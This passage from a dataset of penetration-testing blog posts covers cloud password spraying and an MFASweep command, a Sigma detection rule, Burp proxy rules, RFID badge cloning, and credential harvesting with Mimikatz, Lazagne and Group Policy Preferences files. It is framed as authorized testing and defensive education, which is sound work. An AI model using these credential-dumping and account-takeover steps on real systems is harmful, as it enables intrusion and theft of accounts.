knowledge of what doesn\u2019t work and help an org that really really really wants and needs your help.  I\u2019ll leave you (especially our brothers and sisters at Equifax) a favorite proverb of mine I gave a Director at Target shortly after their breach\u2026\u201dSmooth seas do not make skillful sailors!\u201d  Good luck out there."
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Breaching the Cloud\"\nTaxonomies: \"Informational\"\nCreation Date: \"\"\nBeau Bullock //\n\n*Note: This article was included in the Choose Wisely issue of our PROMPT# zine. It has since been reviewed by the author with minor changes to keep the subject matter up-to-date. \n\nFlashback to only 10 years and you would see a drastic change in how companies manage their computing resources. Chilled datacenters in dark corners of office buildings housed critical infrastructure to protect it from external threat actors. Visualizing where your crown jewels are and how to get to them was a lot easier back then. Most orgs would take a \u201ctower defense\u201d approach to protect sensitive data and critical assets on-premises behind a firewall.  \n\nThis has changed. \n\n\u201cThe cloud\u201d has enabled businesses to grow in ways they could not before. Instead of employees connecting to an on-prem network with VPN to use things like email, intranet sites, and perform daily tasks, they are now leveraging productivity suites that are 100% cloud-based.  \n\nInstead of running a physical server in a datacenter, that same server is now running on a virtual instance in the cloud. Instead of storing large databases or files on physical hard drives, that data is now being stored in cloud-based storage buckets. Instead of defending one tower, organizations now have multiple towers to defend that are spread across the globe (using a cloud provider\u2019s infrastructure) and can be accessed in many ways via public application programming interface (API).  \n\nAs organizations have evolved how they run their infrastructure, so too have our penetration testing methodologies evolved. When it comes to initial access, phishing has been king for many years. A close second to that would be password-based attacks. Both of these attacks look different now due to cloud usage. I used to focus my efforts on finding an externally-exposed Outlook Web Access (OWA) server, as this was a very common webmail tool used by many organizations. OWA, along with VPNs and other externally-exposed authentication portals that leveraged Active Directory-based authentication, were prime targets for password spraying. Now, that focus has shifted towards cloud-based services such as Microsoft 365.  \n\nMicrosoft 365 has changed the way that many businesses manage email. This, in effect, means that instead of targeting an on-prem OWA server, we are now targeting Microsoft 365 services directly. Getting access to an employee\u2019s Microsoft 365 account typically means access to not only email (Outlook), but also SharePoint, Teams, OneDrive, and more.  \n\nI was on a red team engagement for a large financial institution where due to some cloud-based misconfigurations, I was able to remotely compromise their network. After successfully password spraying one of their employees at the Microsoft 365 Outlook portal, I found they had Multi-Factor Authentication (MFA) enabled on the account. This prevented me from logging into the user\u2019s email with a web browser. As mentioned earlier, most cloud services have additional APIs. Azure has one called the Microsoft Graph API. I tried authenticating to this API with the sprayed user\u2019s credentials and, sure enough, I was authenticated and bypassed the need for the user\u2019s MFA. The Graph API allows for reading the Azure Active Directory user list. What this enabled me to do was extract the full username list for the organization where I had previously only had a partial list built during reconnaissance.  \n\nI took the full list, which has thousands more users than I previously had, and started password spraying again. With the full user list, I ended up spraying many more accounts. In testing out authentication for these accounts, I found that some had not yet enrolled in the MFA product used by the company. So I enrolled for them. This now allowed me to authenticate to the Outlook portal with a web browser. In addition to being able to read their email, I could also view what they had permission to read on SharePoint. Their SharePoint site provided details on what was needed to VPN into the network, including the client certificate on a virtual machine and successfully connected over SPN to their network.  \n\nInconsistencies in MFA deployments is one of the bigger trends I have seen when it comes to cloud-based misconfigurations. Conditional access policies allow organizations to enable fine-grained controls over how users authenticate. These can range from the location a user is authenticating from, the device they are using, and also if they are trying to access legacy portals. Because of theses inconsistencies, I wrote a tool to check for potential single-factor access on Microsoft services that I call MFASweep: https://github.com/dafthack/MFASweep \n\nOnce you compromise a set of credentials, checking for MFA inconsistencies can be done by importing the MFASweep PowerShell script and running the following command (substituting the credentials):  \n\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2022 \n\nThere is a big difference between utilizing the cloud for \u201cproductivity\u201d tools vs. \u201cinfrastructure.\u201d Services like Microsoft 365 or Google Workspace enable employees to be productive with things like email, shared drives, chat, and document editing tools. While these are technically \u201ccloud-hosted\u201d services, they are separate from the infrastructure side where virtual machines, databases, web applications, serverless technologies, and more can be spun up. In fact, they have separate APIs in most cases for communicating with them.  \n\nMore organizations are using cloud services for infrastructure instead of hosting systems in their own datacenters. As a penetration tester or red teamer assessing this infrastructure, you much look at these resources from a different angle. What do you do after you get access to an Amazon AWS access key ID and secret access key? If you compromise a Microsoft Azure user who has a subscription, what can you access? How do you pivot in the cloud? These are some of the questions that over the last few years I have needed to answer out of necessity due to facing them head-on. I have collected what I have learned into a training course that I call \u201cBreaching the Cloud.\u201d \n\nThis course services as my own personal methodology that I reference when performing assessments involving any aspect of \u201cthe cloud.\u201d \n\nIn my opinion, we are just scratching the surface of organizations leveraging cloud resources. In addition to the rapid deployment of critical business infrastructure to the cloud, these services themselves are evolving daily. Organizations are still learning new ways to configure access, security protections, and alerting. These, along with completely new services being established altogether, will create a high potential for security issues to arise in the future.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Monitoring High Risk Azure Logins\"\nTaxonomies: \"Blue Team, David Perez, Incident Response, Informational, Azure, Entra ID, SIEM, SOC\"\nCreation Date: \"Thu, 12 Sep 2024 15:00:00 +0000\"\n\nRecently in the SOC, we were notified by a partner that they had a potential business email compromise, or BEC. We commonly catch these by identifying suspicious email forwarding rules, utilizing anomaly detection services, or by reports from our partners, as we did in this scenario. As always, the earlier we can catch these events in the attack chain, the better. This led us to begin investigating high risk logins identified by Azure AD Identity Protection, or what is now known as Entra Identity Protection. \n\nEntra ID protection categorizes risk levels as low, medium, or high. Entra ID also attaches the atRisk label if a potential threat actor has gained access to a user\u2019s account. Determination of risk level is based on the confidence in the signals by Entra ID and utilizes Real-time and Offline detection techniques to assess these values. Organizations not utilizing an Azure AD P2 license will have limited detection capabilities using this service.  \n\nInvestigating these events is straight-forward once you understand what information Entra ID is using to make these detections. The most useful attributes being IP address, operating system, ASN, and country of origin. Once an atRisk login has been identified, I start my investigation by querying the related user account and comparing the surrounding log\u2019s login information to see what normal activity looks like for the user.  \n\nThe detections most closely correlated with multi-factor authentication events were the most useful. Logically speaking, if an MFA request has been sent to a device, then the user account\u2019s password has very likely been compromised. I\u2019ve included this as part of the sigma rule at the bottom of the blog. \n\nThe most common false positives I have seen so far are from users signing in from mobile devices or from different IP addresses due to them being on travel. True positives seem to stick out like a sore thumb, whereas a user is most often seen signing in from a Windows machine, and then suddenly they are seen using a Mac in a different country.  \n\nAzure atRisk Sign-in Events \n\nIn summary, monitoring these alerts more closely has helped us to catch more of these events earlier in the attack chain. I hope this helps you as well. \n\nSigma Rule:  \n\ntitle: High Risk Azure Login Requiring MFAstatus: testeddescription: This detection leverages Azure AD\u2019s built-in service, Azure AD Identity protection, to detect anomalous high risk sign ins to cloud accounts requiring MFA approval. This is an indication that a user\u2019s password has been compromised.references:author: David Perezdate: 2024/07/16tags:\t- attack.t1528\t- attack.credential_accesslogsource:product: azure\tservice: signinlogsdetection:\tselection:risk_state : \u2018atRisk\u2019authentication_requirement : \u2018multiFactorAuthentication\u2019risk1:risk_level_aggregated : \u2018High\u2019risk2: risk_level_during_signin : \u2018High\u2019\tcondition: selection and 1 of risk*falsepositives:\t- Users known to be on travel(most common).\t- Users authenticating with new devices in their possession (i.e. mobile device).\n\nEntra Risk Detections: \n\nThe time difference between a suspicious sign-in event versus a detection in logs/reports can range significantly \u2014 for real-time detections, it is 5-10 minutes, and up to 48 hours for offline detections. \n\nRisk detection Detection type Type riskEventType Sign-in risk detections    Activity from anonymous IP address Offline Premium riskyIPAddress Additional risk detected (sign-in) Real-time or Offline Nonpremium generic = Premium detection classification for non-P2 tenants Admin confirmed user compromised Offline Nonpremium adminConfirmedUserCompromised Anomalous Token Real-time or Offline Premium anomalousToken Anonymous IP address Real-time Nonpremium anonymizedIPAddress Atypical travel Offline Premium unlikelyTravel Impossible travel Offline Premium mcasImpossibleTravel Malicious IP address Offline Premium maliciousIPAddress Mass Access to Sensitive Files Offline Premium mcasFinSuspiciousFileAccess Microsoft Entra threat intelligence (sign-in) Real-time or Offline Nonpremium investigationsThreatIntelligence New country Offline Premium newCountry Password spray Offline Premium passwordSpray Suspicious browser Offline Premium suspiciousBrowser Suspicious inbox forwarding Offline Premium suspiciousInboxForwarding Suspicious inbox manipulation rules Offline Premium mcasSuspiciousInboxManipulationRules Token issuer anomaly Offline Premium tokenIssuerAnomaly Unfamiliar sign-in properties Real-time Premium unfamiliarFeatures Verified threat actor IP Real-time Premium nationStateIP User risk detections    Additional risk detected (user) Real-time or Offline Nonpremium generic = Premium detection classification for non-P2 tenants Anomalous user activity Offline Premium anomalousUserActivity Attacker in the Middle Offline Premium attackerinTheMiddle Leaked credentials Offline Nonpremium leakedCredentials Microsoft Entra threat intelligence (user) Real-time or Offline Nonpremium investigationsThreatIntelligence Possible attempt to access Primary Refresh Token (PRT) Offline Premium attemptedPrtAccess Suspicious API Traffic Offline Premium suspiciousAPITraffic Suspicious sending patterns Offline Premium suspiciousSendingPatterns User reported suspicious activity Offline Premium userReportedSuspiciousActivity Entra Risk Detection Event Types \n\nResources:  \n\nhttps://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-investigate-risk \n\nhttps://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks \n\nhttps://learn.microsoft.com/en-us/entra/id-protection/overview-identity-protection#license-requirements \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Pentesting ASP.NET Cookieless Sessions with Burp\"\nTaxonomies: \"Red Team, Web App, Asp .Net cookliness session, Burp, Pentesting\"\nCreation Date: \"Mon, 04 Jan 2016 22:00:08 +0000\"\nCarrie Roberts & Brian King //\n\nWe were recently testing a web application that used ASP.NET cookieless sessions. This meant that the session token was part of the URL as shown in the example below.\nhttp://www.blackhillsinfosec.com/(S(hd73kdjf780sndyfn23elomzqd5ghwa))/login.html\nIn this case, the session token is of the form (S(LongRandomToken), where LongRandomToken is a long, randomly generated alpha-numeric string and takes the place of  the session cookie.\nThis implementation makes for a messy site map when testing with Burp Suite because the changing tokens make it appear that there are limitless content paths in the application. For example, a site map that has one login page would show up as several different paths because of the changing token values as shown below.\n\nMessy Site Map Due to Multiple Tokens\nWhile we tested, we wanted to have a \"clean\" site map that essentially ignored all of the token values and mapped them as if they weren't there. In addition, we wanted the Burp Suite spider and scanner tools to continue to work. So we came up with the following hack, read on . . .\nThe solution:\nUse two instances of Burp.\nBrowser uses Burp1 as a proxy.\nBurp1 uses Burp2 as a proxy.\nCreate a Match/Replace rule in Burp1 to pull the problematic token out of the request URL and tack it onto the end of the URL as a URL parameter.\nCreate a Match/Replace rule in Burp2 to grab the parameter off the end and put it back.\nUse Burp1 when you want to see the nice site map.\nUse Burp2 when you want to see the requests without tampering.\nBurp1 listens on the default port of 8080 and we configured Burp2 to listen on port 8090.\n\nBurp2 Listens on Port 8090\nThen we configured Burp1 to use Burp2 as an upstream proxy.\n\n Now we have the web application connecting to Burp1, Burp1 connecting to Burp2, and Burp2 connecting to the ASP.NET Server we were testing.\n\nProxy Configuration\nHere are the match and replace rules needed.\nBurp1 Match/Replace Rule:\nMatch: (.*)/(S\\(.*?\\)\\))/([^ ]*)(.*)\nReplace: $1/$3\\?zzzz=$2$4\n\nThis yanks the token out of the URL path and tacks it onto the end of the URL as the zzzz parameter. Don't worry about whether there were already URL parameters and you just added another question mark, we will undo this in the Burp2 proxy before sending to the web server.\nBurp2 Match/Replace Rule:\nMatch: (\\w* /)(.*)\\?zzzz=([^ ]*)(.*)\nReplace: $1$3/$2$4\nThis works and makes a clean site map, but . . .\nThis only affects things that pass through the Burp proxy. If you\u2019re using the spider, the scanner, or other tools, those rules don\u2019t apply. For this second problem, we\u2019ll use Burp\u2019s macros and its session tools. If the parameter had a name, the macros are all we\u2019d need. But because it shows up as a bare value with no name, we\u2019re going to need that upstream instance of Burp again.\nGo to Options > Sessions, and scroll down to the Macros section to add one. You can pull requests from your proxy history, or you can send those requests now and capture them as you go. You want the set of requests necessary to create a new session \u2013 the login steps.\nFor each URL that you need, configure the item so that Burp sends the correct inputs (e.g. username & password) and notices the right things in the responses. Usually, you want it to update the cookie jar and that\u2019s enough. Here, though, there\u2019s no session cookie, and the thing we want doesn\u2019t even have a name.\nWe configured the first item so that it would send a request with no token in it, which causes the server to return HTTP 302 to a URL that does have the token. We configured Burp to extract the token from the HTTP 302 response. Because the actual token has no name, we made up a new name that wasn\u2019t already used anywhere.\nNext, we manually added that parameter to the second request in the query string \u2013 just typed \u201c&aaaa=asdf\u201d at the end of the GET string. Then, we needed to configure that second URL so that it would replace our \u2018asdf\u2019 with whatever was found in the response to the first request.\n\n \n\nClick the \u201cTest Macro\u201d button to make sure that Burp is extracting the right value and putting it in the right place. Look for the \u201cDerived parameters\u201d in the second item. In our test, there was no way to avoid it being URL-encoded. That\u2019s OK here because we\u2019re going to change it in the upstream proxy anyhow. It would have been cleaner if we\u2019d captured only the part between the inner parenthesis.\n\n In the upstream proxy, configure a Match and Replace rule to rewrite that URL into the form the application is expecting.\n\n That rule turns something like this:\nGET /(S(3gmt4o45krcb0bfbzvh2ud55))/Pages/default.aspx?locId=1&aaaa=%28S%28awtsga551hn1bb550xmy2n2i%29%29 HTTP/1.1\nInto something like this:\n/(S(awtsga551hn1bb550xmy2n2i))/Pages/default.aspx?locId=1 HTTP/1.1\nThere\u2019s a problem with this, though - it\u2019s short-lived. There is no actual parameter called \u201caaaa\u201d anywhere in this application, much less right here where we need it. If this were a normal, named parameter, we wouldn\u2019t need to make up a temporary parameter name, and wouldn\u2019t need that upstream proxy to rewrite the URL.\nThis also results in a bit of extra traffic when it\u2019s used, and it can pollute the sitemap a bit. But for a targeted scan of one function at a time, it sure beats having to re-explore the site and run the scan all on one unbroken session.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"InfoSec Basics & Fundamentals\"\nTaxonomies: \"Author, InfoSec 101, John Strand\"\nCreation Date: \"Wed, 06 Jan 2016 22:08:55 +0000\"\n\nJohn Strand //\n\nOne of the more difficult aspects of getting started in any new field is knowing where to begin.  When I got started in this field in 2000 there was very little in the way of getting started.  We had some weird websites and lots of posturing and belittlement. That, and we had a lot of odd folks asking you to \"Cyber\"....\nSo yea...  It pretty much blew.\nWe also hear this industry is going to grow by 200-400% over the next few years.  That is a lot of new people coming in.  And for all that is holy and right in the world, we need more videos which do not feature cats or hippos farting. Not that there is anything wrong with that...  It just has nothing to do with IT security.\n\nPictured\u2026  Noting to do with this article.\nSo, to that end, I have a few videos for everyone.\nThe first one is an intro to Linux video:\n\nIntro to Linux from SANS Institute on Vimeo.\n It goes through the basics and fundamentals of how to approach the command line on a Linux system.  Is it comprehensive?  Nope.   Is it enough to get you started?  Absolutely.\nNext is a video on TCP/IP:\n\n[embed]https://youtu.be/-FPnGj3m6sQ[/embed]\n\nThis video will get you a rough idea of what is going on with the TCP/IP header to drive packets around the internet.\nFinally, the last video is getting started with tcpdump.  This is one of the more important sniffers out there today.  Sure, Wireshark is cool, but tcpdump is fast and very flexible.\nCheck it out here:\n\n[embed]https://youtu.be/NsaMXr72cqo[/embed]\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"RFID Replaying with the Proxmarx3\"\nTaxonomies: \"Physical, Red Team, hacking RFID, RFID\"\nCreation Date: \"Wed, 13 Jan 2016 22:10:01 +0000\"\nRick Wisser //\n\n Ohhh Who Says Tree\u2019s are not Interesting\n\nRFID\u2019s (Radio-Frequency Identification) have been around for a while now and are utilized for Inventory tracking/control, retail, clothing, animal tracking, and door access control, among other uses. Most of these RFID tags are known as passive: meaning that they don\u2019t require power and utilize a magnetic field to be active. This allows them to essentially turn on when an electromagnetic field is near them. When this happens the tag unlocks and transmits a fixed code within the chip. RFID\u2019s can be made into almost any shape and size.\n\nThe most interesting uses of RFID are related to security, such as door access control devices. These usually serve as a name badge as well as a key to grant access to specific doors throughout a facility. Access can be granted based on the work functions of the employee. For example an IT professional will need access to the server room but not necessarily the secretary. Physical penetration testers are always interested in getting a hold of one of these cards, especially if they can just clone a key card. This leads us to a Proxmarx3 device.\n\nAt BHIS we find ourselves hired to do a physical assessment from time to time.  To help in doing these assessments we recently acquired a Proxmarx3 RFID device that can be utilized to clone or replay an RFID door access card. To see how well the Proxmarx3 functions and get familiar with the device I decided to do some testing. I have an RFID card that I use to access my local Recreation Center that I used as the test. (I did get authorization from the Recreation Center Director before conducting the test.)\n\nI first had to update the Proxmarx3 firmware before I could utilize it since the firmware on the device was outdated. I will not go over this portion are several resources on the Internet for flashing and updating the Proxmarx3. Assuming that the device has already been updated, let\u2019s show the functionality of the Proxmarx3:\n\nhttps://www.youtube.com/watch?v=hZs8JsdMAr4\n\n A step-by-step process of the video above:\n\nPlug the USB of the Proxmarx3 into a portable USB battery, note that when plugging it in you will see the lights flash on the Proxmarx3 indicating that it has power.\n\nHold the button on the Proxmarx3 down for about 3 seconds until the lights start to flash then release. The end result should leave the Proxmarx3 setting with a solid red light.\n\nPress and hold the button again until the other red light comes on. This now indicates that the Proxmarx3 is ready for a card to be scanned and read into storage of the device.\n\nPass the RFID tagged device that you want to copy over the antennae until the red light that came on in step 3 goes out. This indicates that the RFID tag information was read into the Proxmarx3 memory.\n\nHold the button down again for about 1 second; a green light should come on. This indicates that the Proxmarx3 is now replaying the captured RFID tag.\n\nTo continue with the testing it was now time to see if the replay portion of the Proxmarx3 was real. After having the key cards information captured/cloned into the Proxmarx3, I headed to the Recreation Center for some testing.\n\nhttps://www.youtube.com/watch?v=FtGNf1fpHps\n\nI accessed the door several times and the Director of the Recreation Center monitored the system to see if it logged my card as being read by the system. He did verify that it was in fact my card being logged on the system when utilizing the Proxmarx3.\n\nIt is nice to see how the Proxmarx3 works, but what about protecting your cards from being cloned? Hence the aluminum wallet myth, I am sure you have all heard of it or seen advertisements for it. In Theory if your cards are in an aluminum wallet they will be protected from being scanned and/or cloned.  I decided to pick one of these up at the local dollar store to give it a try. After several attempts it seems that the aluminum does block or interfere with the electromagnetic field enough to hinder cards contained within it from being accessed with the Proxmarx3. But wait, what about tin foil? I have a couple paranoid friends who we will just say are frugal and believe that tin foil will do the same thing. So out of curiosity I attempted to copy the RFID tag wrapped in tin foil. The results were conclusive and the attempt was unsuccessful. Below is a Video attempting to read the RFID card with these protections in place.\n\nhttps://www.youtube.com/watch?v=OdJ5fXVQBVM\n\nIn conclusion, it looks like the Proxmarx3 is a tool that should be included in your physical pen testing jump bag. Keep in mind that this is just a high level approach to the functionality of the device. More information can be found with a simple search of the internet.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Your Password Is... wait for it... NOT Always Encrypted\"\nTaxonomies: \"External/Internal, Red Team, encryption, mimikatz, passwords\"\nCreation Date: \"Fri, 15 Jan 2016 22:16:59 +0000\"\nSally Vandeven // \n\nAs pentesters we LOVE passwords - they come in all shapes and sizes. A good password has 16+ characters and a mix of case, digits and special characters so that a computer would require many years to brute force it.  Even though these passwords may be difficult to crack, it turns out that they are readily accessible and unencrypted when you know where to look.\n \nUsing a password to login to a system may not seem like the sexiest of hacks, but we can provide great value to the customer by demonstrating to an organization just how easy it is to find and use passwords to do some serious damage in a pentest.  Below is a brief description of some of the quick and easy ways that we harvest passwords to use during a penetration test - including screenshots so you can try this too!  And remember that many users reuse their passwords so these harvested passwords may unlock other accounts as well. Oh \u2013 and if you really want to spoil our fun, implement two-factor authentication.  It is one of the only ways to defeat (or at least slow down) this type of attack.\n\nMimikatz (Get it here)\n\nPasswords must be stored in memory (RAM) on a computer so that the operating system is able to validate the password entered by a user.  Since information stored in RAM looks something like this...\n\n\u2026. it is not straightforward to find which chunks of 1s and 0s represent a password.  Thankfully some smart people have figured it out for us and created tools to extract passwords from this huge blob of data.\n\nOne of those tools is Mimikatz, created by Benjamin Delpy. It can be executed on a live Windows system, against an offline memory dump, or downloaded from a remote site and executed in memory only (very stealthy). Or, as is often the case in pentests, it can be executed via the ever popular Metasploit Meterpreter.\n\nFirst, we\u2019ll show you how to do this using a Meterpreter session setup between an external machine and an internal target. The Meterpreter command Mimikatz will extract and display the cleartext Windows passwords currently resident in the memory of the target machine.  This may even include cached domain passwords.\n\n Set up a listener that the target machine can connect back to.\n\nConnect back to the listener.\n\nEstablish a meterpreter session.\n\n Find the process ID of a process running as SYSTEM.\n\nMigrate into the SYSTEM process.\n\nNow, with the privileges of SYSTEM we can ask Meterpreter to read from memory using two simple commands: \u201cload Mimikatz\u201d and \u201cwdigest\u201d and it will dutifully return all the passwords it can find in memory.\n\nExecute Mimikatz.\n\nUsing a standalone machine for this test with a dummy account we only see one account credential, but a domain connected machine may yield others.\n\nMimikatz can also be used against a memory dump, or more specifically, a memory dump of the process that manages access to a Windows system, lsass.exe.  On a Windows Vista and later system you can use the built-in Task Manager to dump the process memory.  On earlier systems you can use the tool procdump from Sysinternals.  You do need administrator privilege for this operation because it reads from memory making this method a bit less useful during a pentest, but still a handy trick to know.\n\nOn newer versions of Windows use Task Manager to dump RAM.\n\nNote where the file is saved.\n\nOn older Windows systems use procdump to dump RAM.\n\nThen run Mimikatz and from its interface you again have just two simple commands to pull the passwords from the memory dump.\n\nLoad Mimikatz\n\nPoint Mimikatz at the dump file and ask for the passwords.\n\nNext, let\u2019s run Mimikatz right on the Windows workstation to extract the passwords that currently reside in memory.  For this test, we are running a Windows 7 fully patched machine that is not joined to a domain.\n\nFirst download the executable from here.  If you have A/V running it will probably get upset about this download so you will have to allow/whitelist it.\n\nThen just run Mimikatz from the command line and give a couple of commands as shown below.\n\nExecute Mimikatz to extract passwords from a live system (as opposed to a memory dump).\n\nLastly, let\u2019s use a single PowerShell command to download Mimikatz and run it in memory only (no file saved on disk) and dump the memory resident passwords.  The PowerShell script used for this was created by Joseph Bialek and can be found here.  To run this you will need to open an Administrator command prompt (right-click on cmd.exe and \u201cRun as Administrator\u201d).  Then issue the command that fetches the PowerShell script from a web server and executes it as shown below.\n\n Run a simple web server to serve up the PowerShell script.\n\nStart up PowerShell, download and then invoke the Invoke-Mimikatz script.\n\nLazagne (Get it here)\n\nLazagne is a relatively new tool written by Alessandro Zanni that can dump many different passwords found on Windows and Linux/Unix machines.  It is able to extract passwords from web applications that have been saved in browsers as well as mail clients, Wi-Fi configurations, databases, chat clients and more.  If run with Administrator privilege it can also dump Windows password hashes, which can then be cracked or used in pass-the-hash type attacks.\n\nJust run the executable (as Administrator for better results) to extract passwords\n\nWindows Credential Editor - WCE (Get it here)\n\nWCE is an older but still functional tool designed for system administrators to make password management a bit easier. But of course attackers and pentesters can use this tool, too. It must be run with Administrator privilege, again, not ideal in a pentest but sometimes still possible.\n\nWindows Credential Editor dumps passwords from memory.\n\nGroup Policy Preferences - GPP\n\nUp until fairly recently (May 2014 to be exact) there was a feature in Windows called Group Policy Preferences that allowed system administrators to create and manage local administrator accounts on the system under their charge.  This is handy for busy admins because it allows password changes to be done remotely and in bulk.   GPP stored configuration items like the local Administrator account passwords in a file on disk and the actual passwords were encrypted with good, strong AES encryption.  The decryption key for the password was the same for all Windows installations and was accessible to anyone on the Microsoft website.  This means that anyone with access to the GPP file could grab the key from Microsoft and decrypt the passwords contained in the file.  Easy-peasy.  Microsoft patched this in 2014 by removing the option to include password management via the GPP mechanism, however, any old GPP files that existed prior to the patch that were not removed may still contain valid administrator passwords.  We regularly find such files during pentests, and surprisingly the passwords are often still valid!\n\nYou can obtain these passwords by finding the files where they are stored and then passing the encrypted strings to the Ruby script gpp-decrypt.  There is also a Metasploit post-exploitation module gpp that will harvest and decrypt in one step.  Both methods are demonstrated in the screenshots below.\n\nNote that read access to these GPP XML files does NOT require elevated privileges.\n\nCommand to find files containing encrypted Administrator passwords.\n\n Decrypt the passwords with a Ruby script found here.\n\nMetasploit\u2019s GPP module will harvest and decrypt the passwords.Hint: Once you know the local Admin credentials, use the Metasploit module smb_login to find out where else on the domain you might be able to use the account.Other ideas for easy winsHere are a few other tips that you just might get lucky with.  Users (and computers) store passwords in some interesting places:\n\nSearch public data breaches for your domain to find passwords or hashes that have been posted.\n\nLook for password files stored on users\u2019 desktops.\n\nCheck the contents of a user\u2019s clipboard \u2013 it might just contain the last cut & paste password.\n\nIf you have other ideas for extracting cleartext passwords we would love to hear about them.  Send an email to sally (at) blackhillsinfosec (dot com).  Thanks!\n\nReferences\n\nhttp://metasploit.com/modules/post/windows/gather/credentials/gpp\n\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1\n\nhttp://www.ampliasecurity.com/research/windows-credentials-editor/\n\nwww.metasploit.com\n\nhttps://github.com/gentilkiwi/releases/tag/2.0.0-alpha-20160112\n\nhttps://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz\n\nhttps://download.sysinternals.com/files/Procdump.zip\n\nhttps://github.com/AlessandroZ/LaZagne\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Pentesting with Linked Clones\"\nTaxonomies: \"Author, Brian King, How-To, InfoSec 101, linked clones, Pentesting, virtual machine, VM\"\nCreation Date: \"Tue, 19 Jan 2016 22:33:14 +0000\"\nBrian B. King //\n\nIf working with several customers at once, or in succession, it would be easy to lose track of whose data you\u2019re looking at, or to include one customer\u2019s information in another\u2019s report. That would be bad. Using a separate virtual machine for each customer can help you avoid those mistakes, but virtual machines can get pretty big, and can take a long time to create. Having one per client wastes a lot of time and space. That\u2019s not as bad as the other thing, but it\u2019s not good, either.\nEnter Linked Clones.\nWith Linked Clones, you can create a new VM very quickly, and they use much less disk space. You don\u2019t have do anything unusual before you set up a linked clone, so if you\u2019ve got a VM you like, you can start with that. If you want to be extra cautious, you might want to start with a clean one that has no customer data on it at all, since that\u2019s what we\u2019re trying to isolate, here.\nI use a separate VM exclusively for writing reports, so I also create a temporary folder on my host for each test. I map that folder as a shared drive in my testing VM and in my reporting VM. I use that folder to store my screenshots, notes, and other artifacts as I test. This way I still have quick access to all of that when I\u2019m writing the report, but I minimize the risk of keeping sensitive information around.\nOnce I\u2019m done with the test, I can securely archive anything I may need to keep, then destroy the clone and the temporary shared folder. When I start the next test, I can create a fresh clone and know that no customer information will accidentally carry over.\nIn this article, I\u2019m walking through the steps for VirtualBox, but the concept also works with VMWare products and others, so check the manual for whatever you\u2019re using.\nCreate the Base.\nFirst, create a VM with your base operating system and all the tools you need. Install all of the updates and patches available because your clone will inherit them.\nCreate the Clone.\nFirst, right-click on the VM in VirtualBox Manager, and choose Clone\u2026 (or hit CMD-O).\n\n Make a new clone.\nGive the new clone a useful name. If you\u2019re doing an in-depth test where you\u2019ll have a lot of data stored, you might want to name it after the specific customer and use it only for that. If you\u2019re doing less intrusive work, maybe you\u2019ll be comfortable naming it after the current month and using it for more than one customer. Remember what your goals are, and work towards those.\nCheck \u201cReinitialize the MAC address of all network cards\u201d to avoid trouble if you ever end up running more than one of these at a time.\nIn the next step, choose \u201cLinked clone\u201d as the \u201cClone type\u201d, click \u201cClone\u201d, and in a few seconds your linked clone will be ready.\nBenefits\n\nTime: On my average-powered system, it takes just a few seconds to create a Linked Clone, and a few minutes to create a Full Clone. Creating a new VM from scratch can eat up the better part of a day once you account for installing OS updates and tools.\n\nSpace: The Linked Clones share resources with the Base, so each one is significantly smaller than it would otherwise be.\n\nIsolation: Linked Clones allow you to have an isolated test environment for each customer or time period, which minimizes the risk of accidental information disclosure.\n\nNotes and Tips:\n\nUse a different desktop wallpaper or general windowing system appearance, so you can quickly tell which VM you\u2019re in.\n\nUpdates to the Linked Base do not propagate to the Linked Clones after they\u2019ve been created. Get your Linked Base up to date before creating a new clone.\n\nAny time you find a new or updated tool, set it up on the Linked Base, so that future clones will inherit it.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Why The Hate for Threat Intelligence Feeds?\"\nTaxonomies: \"Author, InfoSec 101, John Strand\"\nCreation Date: \"Tue, 26 Jan 2016 22:37:46 +0000\"\nJohn Strand //\n\nRecently on an episode of Security Weekly, I lost my mind on threat intelligence feeds.  I feel just a bit bad about it.\n\n Adorable puppies make everything ok.. \n\nRight Apollo?\n\nBut\u2026  I think I need to explain how I got to this point.  Through SANS and IANS I come into contact with a large number of companies - way more than a normal person should.  About a year or so ago I was all on the threat intelligence feed (TIF) bandwagon.  The idea of sharing information with each other is awesome and powerful.\n\nHowever, something went very wrong with TIFs.\n\nBasically, it boils down to this.  They don\u2019t work.  I know there are going to be people who want to fight me in the streets on this, but it\u2019s true.\n\n Nerd Fight!! \n\nThey just do not work.   Remember, I was a fanboy.  But, over time, I asked more and more of my classes who was using them and if they got value out of them.  The number of people who got value was less than 5%.\n\nFurther, if you step back and think about it, they were a dumb idea to begin with.  Blacklists are a dumb idea.  In many (but not all) ways, TIF is another blacklist or at least a variation on the blacklist theme.  If you want to know more about how blacklisting and enumerating badness is dumb, please read this:\n\nhttp://www.ranum.com/security/computer_security/editorials/dumb/\n\nAll a bad guy needs to do, is not to be on the badness list.\n\nFurther, at BHIS we are attacking organizations all the time.  The tactics and malware both change and stay constant. What changes?  First, the malware.  Malware from engagement to engagement is constantly in flux.  This is because we are in a race to outpace AV.  It is not a hard race, but it does lead to our malware morphing\u2026.  a lot.  The second thing that changes is delivery.  Bypassing mail filters is very similar to bypassing AV.  You have to modify and adapt. Finally, our IP addresses for C2, phishing and attack change quite a bit. Yes, we see the same thing with bad guys as well.\n\nBut there are a whole slew of things which move and adapt far slower.  First, pivoting. When we pivot, we tend to use the same tactics again and again. SMB shares, token impersonation, pass the hash, password spraying, are all staples to what we do almost every day. Further, these tactics we use are pretty much the same the bad guys use. So, why do you need a threat feed to tell you how to detect that?  You can do it, right now, in your organization. Go here: http://tinyurl.com/504extra2\n\nGet the C2_Work spreadsheet and start going through the things listed in there.  This spreadsheet is a small subset of what we do in our C2 pivot tests.  This spreadsheet is a test before the test for our customers.\n\nIf you can detect it, awesome!  If not, you need to start looking at other security approaches.\n\nLike these: https://www.youtube.com/watch?v=wlkILCd_S04\n\nWe can quantify that TIFs are 